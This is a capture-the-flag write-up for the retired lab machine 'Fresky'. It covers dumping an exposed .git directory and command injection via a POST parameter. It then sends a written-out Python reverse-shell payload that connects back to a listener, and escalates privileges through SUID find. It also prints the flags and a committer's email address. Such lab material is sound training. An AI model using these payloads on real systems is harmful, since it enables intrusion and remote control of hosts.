---
Category: B2R
Difficulty: Easy
Platform: PWNX
Retired: true
Status: 3. Complete
---
# Resolution summary

## Used tools

- nmap
- gobuster

---

# Information Gathering

Scanned all TCP ports:

```bash
$ sudo nmap -p- 10.10.10.6 -oN scan/all-tcp-ports.txt -v -sS                                                                                                                                                                              
...                                                                                                                                                                                           
PORT     STATE SERVICE                                                                                                                                                                                                                      
5000/tcp open  upnp                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
Read data files from: /usr/bin/../share/nmap                                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds                                                                                                                                                                                
           Raw packets sent: 65539 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Enumerated open TCP ports:

```bash
$ sudo nmap -p5000 10.10.10.6 -oN scan/open-tcp-ports.txt -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 09:49 EDT
Nmap scan report for fresky.htb (10.10.10.6)
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
```

# Enumeration

## Port 5000 - HTTP Werkzeug httpd 2.0.2 (Python 3.8.10)

Enumerated web files and directories:

```bash
/templates
/.git
```

Download .git files:

```bash
┌──(kali㉿kali)-[~/CTFs/PWNX/Fresky/loot]                                                                                                                                                                                                   
└─$ python3 /opt/git-dumper/git_dumper.py http://10.10.10.6:5000/.git/ git                      
[-] Testing http://10.10.10.6:5000/.git/HEAD [200]                                                                    
[-] Testing http://10.10.10.6:5000/.git/ [200]                                                                        
[-] Fetching common files                                                                                             
[-] Fetching http://10.10.10.6:5000/.gitignore [404]                                                                  
[-] http://10.10.10.6:5000/.gitignore responded with status code 404                            
[-] Fetching http://10.10.10.6:5000/.git/COMMIT_EDITMSG [200]                                   
[-] Fetching http://10.10.10.6:5000/.git/hooks/post-commit.sample [404]                         
[-] http://10.10.10.6:5000/.git/hooks/post-commit.sample responded with status code 404                               
[-] Fetching http://10.10.10.6:5000/.git/hooks/post-update.sample [200]                         
[-] Fetching http://10.10.10.6:5000/.git/hooks/commit-msg.sample [200]                          
[-] Fetching http://10.10.10.6:5000/.git/description [200]                                                            
[-] Fetching http://10.10.10.6:5000/.git/hooks/applypatch-msg.sample [200]                      
[-] Fetching http://10.10.10.6:5000/.git/hooks/post-receive.sample [404]                                              
[-] http://10.10.10.6:5000/.git/hooks/post-receive.sample responded with status code 404        
[-] Fetching http://10.10.10.6:5000/.git/hooks/pre-applypatch.sample [200]                      
[-] Fetching http://10.10.10.6:5000/.git/hooks/pre-push.sample [200]                            
[-] Fetching http://10.10.10.6:5000/.git/hooks/pre-rebase.sample [200]                          
[-] Fetching http://10.10.10.6:5000/.git/hooks/pre-commit.sample [200]                          
[-] Fetching http://10.10.10.6:5000/.git/hooks/pre-receive.sample [200]                         
[-] Fetching http://10.10.10.6:5000/.git/hooks/prepare-commit-msg.sample [200]
...
```

Enumerated git log:

```bash
┌──(kali㉿kali)-[~/…/PWNX/Fresky/loot/git]
└─$ git log
commit d54f396301ee0136c7c47f0986cf5e27f02216c6 (HEAD -> someBranch)
Author: arcangelo <saracinoarcangelo@gmail.com>
Date:   Thu Jun 4 12:16:06 2020 +0200

    confusion

commit 53fb80defc7201960d8dbe03d2eec457423ff5e2
Author: arcangelo <saracinoarcangelo@gmail.com>
Date:   Thu Jun 4 11:08:18 2020 +0200

    stupid trick use file command

commit d676a1b4638111bf09b476545a1282182f10cdc3
Author: arcangelo <saracinoarcangelo@gmail.com>
Date:   Thu Jun 4 10:51:45 2020 +0200

    secret message

commit d4b185a4267d738a8479ed647327a7f30dad222c (master)
Author: arcangelo <saracinoarcangelo@gmail.com>
Date:   Thu Jun 4 09:44:24 2020 +0200

    nullfile added

┌──(kali㉿kali)-[~/…/PWNX/Fresky/loot/git]
└─$ git checkout d676a1b4638111bf09b476545a1282182f10cdc3
Note: switching to 'd676a1b4638111bf09b476545a1282182f10cdc3'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at d676a1b secret message
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/PWNX/Fresky/loot/git]
└─$ ls     
final2.mp3  nullfile
```

# Exploitation

## Remote Command Execution

```bash
┌──(kali㉿kali)-[~/…/PWNX/Fresky/loot/git]
└─$ curl -X POST -d "code=command&command=id" http://10.10.10.6:5000/

uid=1098(user) gid=1098(user) groups=1098(user)
```

Reverse shell:

```bash
POST / HTTP/1.1
Host: 10.10.10.6:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 295

code=command&command=/bin/sh+-c+echo+$(/usr/bin/python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.33.1.178",4443))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("/usr/bin/sh")')%3f
```

```bash
┌──(kali㉿kali)-[~/…/PWNX/Fresky/loot/git]                                                                                                                                                                                                  
└─$ nc -nlvp 4443                                                                                                                                                                                                                           
listening on [any] 4443 ...                                                                                                                                                                                                                 
connect to [10.33.1.178] from (UNKNOWN) [192.168.13.10] 59606
...
$ cat flag1.txt
cat flag1.txt
PWNX{c40f9400c38d0eee8699725c02c6e0c4}
```

# Privilege Escalation

## Suid files enumeration

```bash
$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/find
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
```

## Find privilege escalation

[find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

```bash
$ cd ..
cd ..
$ cd /usr
cd /usr
ls
$ ls
bin  games  include  lib  lib32  lib64  libx32  local  sbin  share  src
$ cd bin
cd bin
$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
$ id
id
uid=1098(user) gid=1098(user) euid=1099(pwnx) groups=1098(user)
$ cat /home/pwnx/*.txt
cat /home/pwnx/*.txt
PWNX{64522a1c421272dbd67aadf906c5c693}
```

# Trophy

>[!success]
>**User.txt**
>PWNX{c40f9400c38d0eee8699725c02c6e0c4}

>[!success]
>**Root.txt**
>PWNX{64522a1c421272dbd67aadf906c5c693}

